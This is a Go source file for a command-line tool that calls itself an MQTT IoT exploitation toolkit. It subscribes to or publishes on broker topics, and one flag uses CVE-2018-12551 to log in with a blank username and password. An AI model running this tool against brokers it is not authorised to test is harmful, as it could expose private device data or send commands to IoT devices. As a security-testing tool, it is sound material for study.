package main

import (
	"crypto/tls"
	"crypto/x509"
	"encoding/hex"
	"flag"
	"fmt"
	"io/ioutil"
	"os"
	"os/signal"
	"strings"
	"time"

	"github.com/yosssi/gmq/mqtt"
	"github.com/yosssi/gmq/mqtt/client"
)

var DEBUG bool

func main() {
	serverFlag := flag.String("host", "127.0.0.1:1883", "Host to connect to")
	tlsFlag := flag.String("tls", "", "PEM CA file for TLS connection")
	subFlag := flag.String("sub", "", "Subscribe mode and topic to subscribe (all topics '#', multiple topics separated by comma)")
	pubFlag := flag.String("pub", "", "Publish mode and topic to publish to")
	cmdFlag := flag.String("msg", "", "Message to publish")
	retainFlag := flag.Bool("retain", false, "Set the retain flag for published message")
	infoFlag := flag.Bool("info", false, "Gets MQTT info")
	timeoutFlag := flag.Int("timeout", 5, "ConnACK timeout in seconds")
	dbgFlag := flag.Bool("dbg", false, "Debug mode")
	clientIDFlag := flag.String("clientid", "", "CLient ID")
	usernameFlag := flag.String("user", "root", "Username")
	passwordFlag := flag.String("pass", "", "Password")
	blankUsernameFlag := flag.Bool("cve-2018-12551", false, "CVE-2018-12551: Authentication with blank username")
	qos2Flag := flag.Bool("qos2", false, "Sets QoS=2 deliver at most once (QoS=0 just deliver is the default)")
	qos1Flag := flag.Bool("qos1", false, "Sets QoS=1 deliver exactly once (QoS=0 just deliver is the default)")
	// splitMsgFlag := flag.Bool("splitmsg", false, "Split message by character (used for some implementations)")
	flag.Parse()

	DEBUG = *dbgFlag

	fmt.Println(banner)
	if DEBUG {
		fmt.Println("[!] Running in debug mode")
	}

	// Set up channel on which to send signal notifications.
	sigc := make(chan os.Signal, 1)
	signal.Notify(sigc, os.Interrupt)

	// Create an MQTT Client.
	cli := client.New(&client.Options{
		// Define the processing of the error handler.
		ErrorHandler: func(err error) {
			fmt.Println(err)
		},
	})

	// Terminate the Client.
	defer cli.Terminate()

	// Configure TLS connection
	tlsConfig := &tls.Config{}
	if *tlsFlag != "" {
		// Load certificate to connect with TLS
		// Read the certificate file.
		b, err := ioutil.ReadFile(*tlsFlag)
		if err != nil {
			panic(err)
		}

		roots := x509.NewCertPool()
		if ok := roots.AppendCertsFromPEM(b); !ok {
			panic("failed to parse root certificate")
		}

		tlsConfig = &tls.Config{
			RootCAs: roots,
		}
	} else {
		tlsConfig = nil
	}

	fmt.Printf("[+] Connecting to %s...\n", *serverFlag)

	connOptions := &client.ConnectOptions{
		Network:        "tcp",
		Address:        *serverFlag,
		TLSConfig:      tlsConfig,
		CONNACKTimeout: time.Second * time.Duration(*timeoutFlag),
	}

	if *clientIDFlag != "" {
		connOptions.ClientID = []byte(*clientIDFlag)
	} else {
		connOptions.CleanSession = true
	}

	if *usernameFlag != "" {
		connOptions.UserName = []byte(*usernameFlag)
	} else {
		fmt.Println("[!] For blank password use '-cve-2018-12551' flag")
		return
	}

	if *blankUsernameFlag {
		connOptions.UserName = []byte("")
		connOptions.Password = []byte("")
	}

	if *passwordFlag != "" {
		connOptions.Password = []byte(*passwordFlag)
	}

	if DEBUG {
		fmt.Println("[*] Conn info:")
		fmt.Printf("\tHost: %s\n", *serverFlag)
		fmt.Printf("\tClientID: %s\n", *clientIDFlag)
		fmt.Printf("\tUser: %s\n", *usernameFlag)
		fmt.Printf("\tPass: %s\n", *passwordFlag)
	}

	// Connect to the MQTT Server.
	if err := cli.Connect(connOptions); err != nil {
		fmt.Println("[!] " + err.Error())
		return
	}

	fmt.Printf("[+] Connected to %s!\n", *serverFlag)

	// Broker info mode
	if *infoFlag {
		fmt.Println("[+] Connected to broker status queue")
		if err := cli.Subscribe(&client.SubscribeOptions{
			SubReqs: []*client.SubReq{
				&client.SubReq{
					TopicFilter: []byte("$SYS/#"),
					QoS:         mqtt.QoS0,
					Handler:     msgHandler,
				},
			},
		}); err != nil {
			fmt.Println(err)
			return
		}
	}

	// Subscriber mode
	if *pubFlag == "" && *subFlag != "" {
		var topics []string
		if strings.Contains(*subFlag, ",") {
			topics = strings.Split(*subFlag, ",")
		} else {
			topics = append(topics, *subFlag)
		}

		subs := []*client.SubReq{}
		for _, topic := range topics {
			newCliSubReq := &client.SubReq{
				TopicFilter: []byte(topic),
				QoS:         mqtt.QoS1,
				Handler:     msgHandler,
			}

			subs = append(subs, newCliSubReq)
		}

		fmt.Printf("[+] Subscribing to '%s' queues...\n", *subFlag)

		if err := cli.Subscribe(&client.SubscribeOptions{
			SubReqs: subs,
		}); err != nil {
			panic(err)
		}

		fmt.Printf("[+] Subscribed to '%d' queues!\n", len(subs))
	}

	// Publish mode
	if *pubFlag != "" && !*infoFlag && *subFlag == "" {
		if *cmdFlag == "" {
			fmt.Println("-msg can not be empty")
			return
		}

		fmt.Println("[+] Sending message to topic...")
		cmd := []byte(*cmdFlag)
		cmd = append(cmd, []byte{0x0d, 0x0a}...)

		var retain bool
		if *retainFlag {
			retain = true
		}

		cliPubOpts := &client.PublishOptions{
			QoS:       mqtt.QoS0,
			Retain:    retain,
			TopicName: []byte(*pubFlag),
			Message:   cmd,
		}

		if *qos2Flag {
			cliPubOpts.QoS = mqtt.QoS2
		} else if *qos1Flag {
			cliPubOpts.QoS = mqtt.QoS1
		} else {
			cliPubOpts.QoS = mqtt.QoS0
		}

		if err := cli.Publish(cliPubOpts); err != nil {
			panic(err)
		}

		time.Sleep(time.Second * 1)
		fmt.Println("[+] Message sent!")

		return
	}

	// Wait for receiving a signal.
	<-sigc

	if err := cli.Disconnect(); err != nil {
		fmt.Println(err)
		return
	}

	fmt.Println("[+] Bye!")
}

func msgHandler(topicName, message []byte) {
	if DEBUG {
		fmt.Println("> Topic: [" + string(topicName) + "]")
		fmt.Println(hex.Dump(message))
	} else {
		fmt.Println("> Topic: ["+string(topicName)+"]\n", string(message))
	}
}

var banner = `       _
      |0|
   .--'+'--.
   |'-----'|
   |  | |  |
   |>/.-.\<|
   |/(0.0)\|    Citronella v0.0.1
   | /\ /\ |    A MQTT IoT exploitation toolkit
   |/  |  \|
   |\  |  /|	By @gonzalezkrause
   |   |   |
   '-.___.-'
`
